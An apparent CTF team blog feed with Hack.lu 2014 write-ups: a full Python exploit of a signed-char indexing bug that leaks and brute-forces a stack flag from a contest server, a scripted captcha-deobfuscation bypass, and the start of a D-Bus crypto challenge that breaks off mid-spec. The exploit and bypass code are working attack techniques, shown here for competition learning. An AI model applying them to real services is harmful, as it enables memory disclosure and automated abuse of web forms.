<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: hacklu | CaptchaFlag CTF Team]]></title>
  <link href="http://www.captchaflag.com/blog/categories/hacklu/atom.xml" rel="self"/>
  <link href="http://www.captchaflag.com/"/>
  <updated>2014-10-28T16:35:43-04:00</updated>
  <id>http://www.captchaflag.com/</id>
  <author>
    <name><![CDATA[Captchaflag]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Guess the Flag]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/"/>
    <updated>2014-10-28T15:05:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Look at that guy over there! He's a bandit from the group that robs the
stagecoaches in unpredictable intervals. I think he hasn't been with them for
very long, so he can't tell whether you're one of them. Try to look like a
bandit and talk to him. He probably won't just tell you their plan for the
attack, but maybe you can ask him some questions?</p>

<p>nc wildwildweb.fluxfingers.net 1412</p>

<h3>Partial Source</h3>

<p>```c
int is<em>flag</em>correct(char <em>flag_hex /</em> the user's guess in hex */) {
  if (strlen(flag<em>hex) != 100) {
    printf(&quot;bad input, that hexstring should be 100 chars, but was %d chars long!\n&quot;, (int)strlen(flag</em>hex));
    exit(0);
  }</p>

<p>char bin<em>by</em>hex[256] = { /* table for looking up the value of a hex character – -1 means invalid <em>/
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
     0,  1,  2,  3,  4,  5,  6,  7,  8,  9, -1, -1, -1, -1, -1, -1, /</em> 0-9 <em>/
    -1, 10, 11, 12, 13, 14, 15, -1, -1, -1, -1, -1, -1, -1, -1, -1, /</em> A-F <em>/
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, 10, 11, 12, 13, 14, 15, -1, -1, -1, -1, -1, -1, -1, -1, -1, /</em> a-f */
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
  };</p>

<p>/* the correct flag was censored out */
  char flag[50] = &quot;flag{0123456789abcdef0123456789abcdef0123456789ab}&quot;;</p>

<p>// decode flag<em>hex into given</em>flag so we can compare them
  char given<em>flag[50];
  bzero(given</em>flag, 50);
  for (int i=0; i&lt;50; i++) {
    char value1 = bin<em>by</em>hex[flag<em>hex[i*2  ]];
    char value2 = bin</em>by<em>hex[flag</em>hex[i*2+1]];
    if (value1 == -1 || value2 == -1) {
      printf(&quot;bad input – one of the characters you supplied was not a valid hex character!\n&quot;);
      exit(0);
    }
    given_flag[i] = (value1&lt;&lt;4) | value2;
  }</p>

<p>// timing-safe comparison of the two flags
  char diff = 0;
  for (int i=0; i&lt;50; i++) {
    diff |= (flag[i] ^ given_flag[i]);
  }</p>

<p>return (diff == 0);
}
```</p>

<h2>Analysis</h2>

<p>An visual inspection of the source code raised some potential issues, but they
were all red herrings. For instance, the rtrim() function increments by 2
instead of one, but that doesn't buy us anything:</p>

<p><code>c
void rtrim(char *str) {
  for (char *p = str+strlen(str)-1; p&gt;=str; p--) {
    if (!strchr(&quot; \r\n&quot;, *p)) break;
    *p = '\0';
    p--;
  }
}
</code></p>

<p>The challenge prompt says to compile the source with <code>gcc -std=gnu99 -g</code>, but
we added <code>-Wall and -Wextra</code> and compiled:</p>

<p><code>
guess_the_flag_censored.c:51:3: warning: implicit declaration of function ‘bzero’ [-Wimplicit-function-declaration]
   bzero(given_flag, 50);
   ^
guess_the_flag_censored.c:53:5: warning: array subscript has type ‘char’ [-Wchar-subscripts]
     char value1 = bin_by_hex[flag_hex[i*2  ]];
     ^
guess_the_flag_censored.c:54:5: warning: array subscript has type ‘char’ [-Wchar-subscripts]
     char value2 = bin_by_hex[flag_hex[i*2+1]];
     ^
</code></p>

<p>Joy! an array is indexed with a character type, which is treated as a signed
value. The focus is now on exploiting that in order to access or change the
<code>flag</code> which is also stored on the stack. The potentially negative indicies are
only used when reading, which eliminates the possibility of injecting
shellcode. This seemed to be a let-down at first, but what we do see is that
the <code>value1</code> and <code>value2</code> variables can be influenced. This leads to the
population of the <code>given_flag</code> string. Can we force <code>given_flag</code> to be accepted
by copying the bytes from <code>flag</code>?</p>

<h2>Solution</h2>

<p>We ran the program locally under a debugger to discover that <code>flag</code> is located
128 bytes before <code>bin_by_hex</code>. Subtract the &quot;flag{&quot; prefix, and the offset for
the 44 byte hexadecimal string is at offset -123. The following code generates
an input which should exploit the defect:</p>

<p>```python</p>

<h1>!/usr/bin/env python</h1>

<p>import sys</p>

<p>start = -123</p>

<h1>Python doesn't support chr(-x), so do unsigned -&gt; signed conversion.</h1>

<p>def twos_comp(n):
    return 256 + n</p>

<h1>Generate a flag which exploits the char-index defect. This flag should always</h1>

<h1>work, even though it is an invalid format.</h1>

<h1>In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)</h1>

<p>def generate<em>flag():
    s = twos</em>comp(start)
    l = []
    # This loop causes server to copy the hidden flag; instead of expanding hex
    for i in xrange(44):
        l += ['0' + chr(s + i)] # Put a zero in the high order nibble
                                # Place negative offset of this flag char in low-order
    return l</p>

<h1>Format the flag and encode it for the wire</h1>

<p>def encode_flag(f):
    return 'flag{'.encode('hex') + \
           ''.join(f) + \
           '}'.encode('hex') + '\n'</p>

<p>sys.stdout.write(encode<em>flag(generate</em>flag()))
```</p>

<p>The output ends up looking like: <code>666c61677b0\x850\x860\x870\x88...</code> where
<code>666c61677b</code> is the encoded &quot;flag{&quot;, the zero nibbles corresponds to <code>value1</code>,
and the 0x85,0x86,... are negative integers corresponding to <code>value2</code>. This
leads to populating <code>given_flag</code> as:
<code>c
for (i=0; i&lt;50; i++) { given_flag[i] = (0&lt;&lt;4) | flag[i] }
</code></p>

<p>Sure enough, this payload works locally, but it fails remotely. Is the system
employing ASLR? Is the layout static, but different somehow? We could write
code to guess the offset, but let's just see what happens if we assume the
system is 32-bit. Compile with <code>-m32</code> and we see the offset is now 64 bytes
instead of 128. Therefore, we change start from -123 to -59. This change works
against the server and we now see: &quot;Yaaaay! You guessed the flag correctly! But
do you still remember what you entered? If not, feel free to try again!&quot;</p>

<p>We don't have the flag, but we do have a way to test each byte in isolation. We
start with the payload we generated, and try all hexadecimal values [0-9a-f]
for the first character until the correct one is found. Then, repeat with the
second character, until the last (44th) character is verified. Therefore, the
problem space is greatly reduced from 16^44 to 16*44; 50 orders of magnitude.</p>

<p>The complete solution is listed below:
```python</p>

<h1>!/usr/bin/env python</h1>

<p>import sys, socket</p>

<h1>stack location of flags var, relative to bit<em>to</em>hex</h1>

<p>start = -59            # For 64-bit machines replace with: -123
host  = 'wildwildweb.fluxfingers.net'
port  = 1412</p>

<h1>Python doesn't support chr(-x), so do unsigned -&gt; signed conversion.</h1>

<p>def twos_comp(n):
    return 256 + n</p>

<h1>Generate a flag which exploits the char-index defect. This flag should always</h1>

<h1>work, even though it is an invalid format.</h1>

<h1>In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)</h1>

<p>def generate<em>flag():
    s = twos</em>comp(start)
    l = []
    # This loop causes server to copy the hidden flag; instead of expanding hex
    for i in xrange(44):
        l += ['0' + chr(s + i)] # Put a zero in the high order nibble
                                # Place negative offset of this flag char in low-order
    return l</p>

<h1>Format the flag and encode it for the wire</h1>

<p>def encode_flag(f):
    return 'flag{'.encode('hex') + \
           ''.join(f) + \
           '}'.encode('hex') + '\n'</p>

<h1>Were we successful?</h1>

<p>def check_resp(r):
    return r.startswith('Yaaaay')</p>

<h1>Were we successful (for the prior request)?</h1>

<p>def check<em>sock(s):
    rv = check</em>resp(s.recv(1024))
    return rv</p>

<h1>Send a flag to the server</h1>

<p>def send<em>flag(s, f):
    # Eat the prompt
    s.recv(1024)
    # Bonvoyage!
    s.send(encode</em>flag(f))</p>

<h1>Connect</h1>

<p>s = socket.socket(socket.AF<em>INET, socket.SOCK</em>STREAM)
s.connect((host, port))</p>

<h1>Eat the MOTD</h1>

<p>print s.recv(1024)</p>

<h1>This flag should work, as long as the offset is correct</h1>

<p>base = generate_flag()</p>

<p>print &quot;VERIFYING FLAG OFFSET...&quot;
send<em>flag(s, base)
if check</em>sock(s):
    print &quot;  Success!&quot;
else:
    print &quot;  Failed!&quot;
    sys.exit(1)</p>

<h1>Accumulate the flag as it is discovered</h1>

<p>discovered = []</p>

<p>for i in xrange(len(base)):
    mutant = base[:]
    disc_byte = '??'
    for j in '0123456789abcdef':
        byte = j.encode('hex')
        mutant[i] = byte</p>

<pre><code>    send_flag(s, mutant)
    if check_sock(s):
        disc_byte = byte
        print &quot;%d -&gt; 0x%s&quot; % (i, byte)
        break
discovered += disc_byte
</code></pre>

<p>print &quot;VERIFYING FINAL FLAG...&quot;
send<em>flag(s, discovered)
if check</em>sock(s):
    print &quot;  Success! The flag is: %s&quot; % encode_flag(discovered)
else:
    print &quot;  Failed!&quot;
```</p>

<p>The result is
<code>
666c61677b3639373437333661373537
33373436633639366236353639366537
34363836353664366637363639363537
337d
</code>
Decode, and we get &quot;flag{6974736a7573746c696b65696e7468656d6f76696573}&quot;.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Dalton's Corporate Security Safe for Business]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/"/>
    <updated>2014-10-24T23:54:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>The Dalton Brothers are tricking people into buying their &quot;safe&quot; locks. So they
can rob them afterwards. The lock has some safety features, as it resets itself
after a few seconds. It also requires a lot of valid inputs before it's letting
you open it. Please find out what their weakness is and report back. </p>

<p><a href="https://wildwildweb.fluxfingers.net:1422/">link</a></p>

<h2>Analysis</h2>

<p>The captcha image is being painted in a canvas clientside by JavaScript. This
is done in 8 ways. 3 examples are:</p>

<p>1) Base64 Decoding a value
2) Using Javascript.fromCharCode()
3) /n/.source</p>

<p>These values are then inserted using
<a href="http://www.w3schools.com/tags/canvas_filltext.asp">fillText()</a>. The fillText
function looks like this (var,x,y), where x is left right relative to the HTML
canvas and y is up down relative to the canvas.  So to put the numbers in
order, you can grep out the fillText functions and sort by the x position to
get them in the right order.</p>

<h2>Solution</h2>

<p>Since there is a lot of variance in how the variables are assigned and used to
build the captcha (including some variable reuse), it seemed to make the most
sense to store these values immediately after they are used, then populate and
submit the form automatically. Because of this, I decided to modify the
JavaScript inline using Burp. I used the following search/replace rules on the
response body:</p>

<p><code>
match: &lt;script&gt;
replace: &lt;script&gt;blakeval={};
</code></p>

<p><code>
match: fillText\((.*?)\)
replace: fillText($1);var args=&quot;$1&quot;.split(','); var b1=args[0]; var b2=args[1]; blakeval[b2]=eval(b1);
</code></p>

<p><code>
match: &lt;/script&gt;
replace: var fieldval = &quot;&quot;; for(var key in blakeval) { fieldval += blakeval[key] }; document.getElementsByName('solution')[0].value = fieldval; document.forms[0].submit()&lt;/script&gt;
</code></p>

<p>By using the x index from fillItem() as the key in property, it will be autosorted in the way that we need. Then simply populate the form and submit. Wait a while and then the link is unlocked.</p>

<p><code>
https://wildwildweb.fluxfingers.net:1422/?login=rRrtTE0WYFh5bVHToYQwKyvP
</code></p>

<p>Flag:
<code>
fef9565c97c3a62fe10d2a0084a9e8179d72f4a05084997cb80e900d1a77a42e3
</code></p>

<h2>Alternative Solution</h2>

<p>This solution (written in Python) utilizes the following workflow:
 * Request the HTTP session, find the &lt;script&gt; and separate the
   Javascript into individual lines
 * Parse the Javascript (minding the X-coordinate of the textfill() function to
   reassemble the order.  There are a total of eight tricks they're using to
   obfuscate the characters, so there's are eight branches depending on which
   one we've encountered.
 * Extract the characters and PHP session ID, then resubmit the page.
 * Loop repeatedly until the locks allow access to the flag
 * Access the flag when the URL is unlocked.</p>

<p>It's a terrible, terrible script, but here it is for grins.</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import sys
import re # RegEx to extract <script> .* </script>
import requests   # Used for GET/POST requests
import base64  # Needed to deobfuscate some of the characters</p>

<h1>This generates Javascript output and is used to verify the decoding of each character and position</h1>

<p>debug = False</p>

<h1>The hard work is broken into four functions</h1>

<h1>isALetter - detect the presence of any of the eight obfuscation methods</h1>

<h1>extractLetter - deobfuscate the Javascript (using one of eight techniques)</h1>

<h1>isAPosition - detects the presence of fillText() which is used to draw a character and includes the X,Y coordinates</h1>

<h1>extractPosition - extracts the X coordinates of the character being printed</h1>

<p>def extractLetter(line):
  if 'atob' in line:
    if debug: print &quot;1&quot;, line,
    line = line.split(&quot;(&quot;)[1]
    line = line.split(&quot;)&quot;)[0]
    line = base64.b64decode(line)
    if debug: print  line
    return line
  elif 'fromCharCode' in line:
    if debug: print &quot;2&quot;, line,
    line = line.split(&quot;(&quot;)[1]
    line = line.split(&quot;)&quot;)[0]
    line = chr(int(line))
    if debug: print  line
    return line
  elif '.source' in line:
    if debug: print &quot;3&quot;, line, 
    line = line.split(&quot;/&quot;)[1]
    line = line.split(&quot;/&quot;)[0]
    if debug: print line
    return line
  elif '!1' in line:    #false
    string = &quot;false&quot;
    if debug: print &quot;4&quot;, line, 
    line = line.split(&quot;[&quot;)[1]
    line = line.split(&quot;]&quot;)[0]
    line = string[int(line)]
    if debug: print line
    return line
  elif '[]+{}' in line:  #[object Object]
    string = &quot;[object Object]&quot;
    if debug: print &quot;5&quot;, line, 
    line = line.split(&quot;[&quot;)[2]
    if debug: print &quot;/&quot;,line,&quot;/&quot;,
    line = line.split(&quot;]&quot;)[0]
    if debug: print &quot;|&quot;,line,&quot;|&quot;,
    line = string[int(line)]
    if debug: print line
    return line
  elif &quot;&quot;&quot;[][+[]]+&quot;&quot;&quot;&quot;&quot; in line:
    string = &quot;undefined&quot;
    if debug: print &quot;6&quot;, line, 
    line = line.split(&quot;[&quot;)[4]
    line = line.split(&quot;]&quot;)[0]
    line = string[int(line)]
    if debug: print line
    return line
  elif &quot;''+!0&quot; in line:
    string = &quot;true&quot;
    if debug: print &quot;7&quot;, line, 
    line = line.split(&quot;[&quot;)[1]
    line = line.split(&quot;]&quot;)[0]
    line = string[int(line)]
    if debug: print line
    return line
  elif &quot;).toString(&quot; in line: 
    string = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;
    if debug: print &quot;8&quot;, line, 
    line = line.split(&quot;(&quot;)[1]
    line = line.split(&quot;)&quot;)[0]
    line = string[int(line)]
    if debug: print line
    return line
  elif 'var' in line and 'createLinearGradient' not in line and 'getContext' not in line:
    print &quot;?&quot;, line
    return &quot;&quot;
  elif 'fillText' in line:
    if debug: print &quot;!&quot;, line
    return &quot;&quot;
  else: 
    return &quot;&quot;</p>

<p>def isALetter(line):
  if 'atob' in line: return True
  elif 'fromCharCode' in line: return True
  elif '.source' in line: return True
  elif '!1' in line: return True
  elif '[]+{}' in line: return True
  elif &quot;&quot;&quot;[][+[]]+&quot;&quot;&quot;&quot;&quot; in line: return True
  elif &quot;''+!0&quot; in line: return True
  elif &quot;).toString(&quot; in line: return True
  else: return False</p>

<p>def isAPosition(line):
  if 'fillText' in line: return True</p>

<p>def extractPosition(line):
  if 'fillText' in line:
    pos = line.split(&quot;,&quot;)[1]
    if debug: print &quot;POS = &quot;, pos
    return int(pos)
  else:
    return false</p>

<p>url='https://wildwildweb.fluxfingers.net:1422/'
cookies = dict()
params = dict()
PHPSESSID = &quot;&quot;</p>

<p>r = requests.get(url, cookies=cookies)</p>

<p>PHPSESSID = r.cookies['PHPSESSID']
cookies['PHPSESSID'] = PHPSESSID</p>

<p>for i in range(0,100):</p>

<p>r = requests.get(url, cookies=cookies)
  #print r.cookies['PHPSESSID']</p>

<p>script = re.findall(r&quot;.<em>script.</em>&quot;, r.content)[0]
  scriptLines = re.sub(r&quot;;&quot;, &quot;;\n&quot;, script)
  scriptLines = scriptLines.split(&quot;\n&quot;)</p>

<p>answerArray = [None] * 100
  answerString = &quot;&quot;</p>

<p>for scriptLine in scriptLines:
    if isALetter(scriptLine):
      letter = extractLetter(scriptLine)
    if isAPosition(scriptLine):
      position = extractPosition(scriptLine)
      answerArray[position] = letter</p>

<p>for letter in answerArray:
    if letter != None:
      answerString += letter</p>

<p>print &quot; -- REPLYING:&quot; , answerString
  params['solution'] = answerString
  params['submit'] = &quot;OK&quot;</p>

<p>r = requests.post(url, cookies=cookies, data=params)</p>

<p># print r.content</p>

<p>for line in r.content.splitlines():
    if '<p>' in line: print line
    if '<li>' in line:
      print line
      if 'a href=&quot;?login=' in line:
        line = line.split('&quot;')
        q = requests.get(url + line[1], cookies=cookies)
        print q.content
        sys.exit(0)
    if 'slow' in line: print line
    if 'anew' in line: print line
    if 'good' in line: print line
```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Douchemac]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-douchemac/"/>
    <updated>2014-10-24T14:57:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-douchemac</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<ul>
<li>by martin (Crypto)</li>
<li>200 (+100) Points</li>
</ul>

<p>Our companion Jesse James shot a carrier pigeon. It had a letter containing weird characters. Maybe it has something todo with the local gold mine. </p>

<p>Download</p>

<h2>Analysis</h2>

<p>The download is a pcap of D-BUS traffic.</p>

<p>Eventually, you find:</p>

<h2>```text</h2>

<p>|        SIMPLE SECURE NOTES STORAGE SYSTEM            |
| DOUCHEMAC-SHA256-CBC Authentication System           |
| 1. start a session (valid 10 min)                    |
| 2. authenticate                                      |
| 3. work                                              |
|                                                      |
|                                                      |
| NULL padding                                         |</p>

<hr>

<p>Use ID: 75288142666
Use Nonce: z9TxSOvwZ21KDcHQeTef8Q== to xor your key!</p>

<p>```</p>

<p>There are two TCP Flows in the PCAP:</p>

<p>One:</p>

<p>```text
.AUTH EXTERNAL 363636
REJECTED EXTERNAL DBUS<em>COOKIE</em>SHA1 ANONYMOUS
AUTH DBUS<em>COOKIE</em>SHA1 363636
REJECTED EXTERNAL DBUS<em>COOKIE</em>SHA1 ANONYMOUS
AUTH ANONYMOUS 6c69626462757320312e382e38
OK aba45dc8a0c4d0ff480a9adc5433de97
BEGIN
l...........n.....o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....Hello...l...
.......=.....s.....:1.31.....u.......g..s....s.....org.freedesktop.DBus........:1.31.l.................o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....GetNameOwner......g..s......test.test123.Server.l...
.............o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....NameAcquired......s.....:1.31.....g..s....s.....org.freedesktop.DBus........:1.31.l...
.......=.....s.....:1.31.....u.......g..s....s.....org.freedesktop.DBus........:1.30.l...........c.....o...../Server...s.....:1.30.....s.#...org.freedesktop.DBus.Introspectable.......s.
...Introspect......l.................o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....GetNameOwner......g..s......test.test123.Server.l.................s.....:1.31.....u.......g..s....s.....:1.30.......&lt;!DOCTYPE node PUBLIC &quot;-//freedesktop//DTD D-BUS Object Introspection 1.0//EN&quot;
&quot;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd&quot;&gt;
<node name="/Server">
  <interface name="org.freedesktop.DBus.Introspectable">
    <method name="Introspect">
      <arg direction="out" type="s" />
    </method>
  </interface>
  <interface name="test.test123.Interface">
    <method name="dbus_genrnd">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
  </interface>
  <interface name="test.test123.Server">
    <method name="dbus_authc">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="msg" />
      <arg direction="in"  type="s" name="iv" />
      <arg direction="in"  type="s" name="tag" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_auths">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="msg" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_time">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_list">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_put">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="filename" />
      <arg direction="in"  type="s" name="text" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_get">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="filename" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_start">
      <arg direction="out" type="s" />
    </method>
  </interface>
</node>
.l...
.......=.....s.....:1.31.....u.......g..s....s.....org.freedesktop.DBus........:1.30.l...........c.....o...../Server...s.....:1.30.....s.#...org.freedesktop.DBus.Introspectable.......s.
...Introspect......l.................s.....:1.31.....u.......g..s....s.....:1.30.......&lt;!DOCTYPE node PUBLIC &quot;-//freedesktop//DTD D-BUS Object Introspection 1.0//EN&quot;
&quot;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd&quot;&gt;
<node name="/Server">
  <interface name="org.freedesktop.DBus.Introspectable">
    <method name="Introspect">
      <arg direction="out" type="s" />
    </method>
  </interface>
  <interface name="test.test123.Interface">
    <method name="dbus_genrnd">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
  </interface>
  <interface name="test.test123.Server">
    <method name="dbus_authc">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="msg" />
      <arg direction="in"  type="s" name="iv" />
      <arg direction="in"  type="s" name="tag" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_auths">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="msg" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_time">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_list">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_put">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="filename" />
      <arg direction="in"  type="s" name="text" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_get">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="filename" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_start">
      <arg direction="out" type="s" />
    </method>
  </interface>
</node>
.l...........3.....o...../Server...s.....:1.30.....s.
...dbus_start......l.................s.....:1.31.....u.......g..s....s.....:1.30....... ------------------------------------------------------
|        SIMPLE SECURE NOTES STORAGE SYSTEM            |
| DOUCHEMAC-SHA256-CBC Authentication System           |
| 1. start a session (valid 10 min)                    |
| 2. authenticate                                      |
| 3. work                                              |
|                                                      |
|                                                      |
| NULL padding                                         |</p>

<hr>

<p>Use ID: 75288142666
Use Nonce: z9TxSOvwZ21KDcHQeTef8Q== to xor your key!
.
```</p>

<p>The other:</p>

<p>```text
.AUTH EXTERNAL 363636
REJECTED EXTERNAL DBUS<em>COOKIE</em>SHA1 ANONYMOUS
AUTH DBUS<em>COOKIE</em>SHA1 363636
REJECTED EXTERNAL DBUS<em>COOKIE</em>SHA1 ANONYMOUS
AUTH ANONYMOUS 6c69626462757320312e382e38
OK aba45dc8a0c4d0ff480a9adc5433de97
BEGIN
l...........n.....o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....Hello...l...
.......=.....s.....:1.32.....u.......g..s....s.....org.freedesktop.DBus........:1.32.l.................o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....GetNameOwner......g..s......test.test123.Server.l...
.............o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....NameAcquired......s.....:1.32.....g..s....s.....org.freedesktop.DBus........:1.32.l...
.......=.....s.....:1.32.....u.......g..s....s.....org.freedesktop.DBus........:1.30.l...........c.....o...../Server...s.....:1.30.....s.#...org.freedesktop.DBus.Introspectable.......s.
...Introspect......l.................o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....GetNameOwner......g..s......test.test123.Server.l.................s.....:1.32.....u.......g..s....s.....:1.30.......&lt;!DOCTYPE node PUBLIC &quot;-//freedesktop//DTD D-BUS Object Introspection 1.0//EN&quot;
&quot;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd&quot;&gt;
<node name="/Server">
  <interface name="org.freedesktop.DBus.Introspectable">
    <method name="Introspect">
      <arg direction="out" type="s" />
    </method>
  </interface>
  <interface name="test.test123.Interface">
    <method name="dbus_genrnd">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
  </interface>
  <interface name="test.test123.Server">
    <method name="dbus_authc">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="msg" />
      <arg direction="in"  type="s" name="iv" />
      <arg direction="in"  type="s" name="tag" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_auths">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="msg" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_time">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_list">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_put">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="filename" />
      <arg direction="in"  type="s" name="text" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_get">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="filename" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_start">
      <arg direction="out" type="s" />
    </method>
  </interface>
</node>
.l...
.......=.....s.....:1.32.....u.......g..s....s.....org.freedesktop.DBus........:1.30.l...........c.....o...../Server...s.....:1.30.....s.#...org.freedesktop.DBus.Introspectable.......s.
...Introspect......l.................s.....:1.32.....u.......g..s....s.....:1.30.......&lt;!DOCTYPE node PUBLIC &quot;-//freedesktop//DTD D-BUS Object Introspection 1.0//EN&quot;
&quot;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd&quot;&gt;
<node name="/Server">
  <interface name="org.freedesktop.DBus.Introspectable">
    <method name="Introspect">
      <arg direction="out" type="s" />
    </method>
  </interface>
  <interface name="test.test123.Interface">
    <method name="dbus_genrnd">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
  </interface>
  <interface name="test.test123.Server">
    <method name="dbus_authc">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="msg" />
      <arg direction="in"  type="s" name="iv" />
      <arg direction="in"  type="s" name="tag" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_auths">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="msg" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_time">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_list">
      <arg direction="in"  type="s" name="id" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_put">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="filename" />
      <arg direction="in"  type="s" name="text" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_get">
      <arg direction="in"  type="s" name="id" />
      <arg direction="in"  type="s" name="filename" />
      <arg direction="out" type="s" />
    </method>
    <method name="dbus_start">
      <arg direction="out" type="s" />
    </method>
  </interface>
</node>
.l...........?.....o...../Server...s.....:1.30.....s.....dbus<em>time.........g..s......75288142666.l.................s.....:1.32.....u.......g..s....s.....:1.30...
...1412688735.91.l...........?.....o...../Server...s.....:1.30.....s.....dbus</em>genrnd.......g..s......75288142666.l.................s.....:1.32.....u.......g..s....s.....:1.30.......+pVgvsPDX1LI7xDc/AS9Fg==
.</p>

<p>```</p>

<p>Here, we installed D-Feet, a d-bus debugger that can be used for remote interaction.</p>

<p>Using D-Feet to interact with the server, we called the help function, which returned:
```text</p>

<hr>

<p>|        SIMPLE SECURE NOTES STORAGE SYSTEM            |
| DOUCHEMAC-SHA256-CBC Authentication System           |
|                                                      |
| SPEC:                                                |
|   blocksize = 16                                     |
|   k = k ^ nonce                                      |
|   while len(M) % 16: M || NULL                       |
|   M = M<em>0 || M</em>1 ...                                 |
|   tag<em>0 = sha256(k || M</em>0 ^ iv)                      |
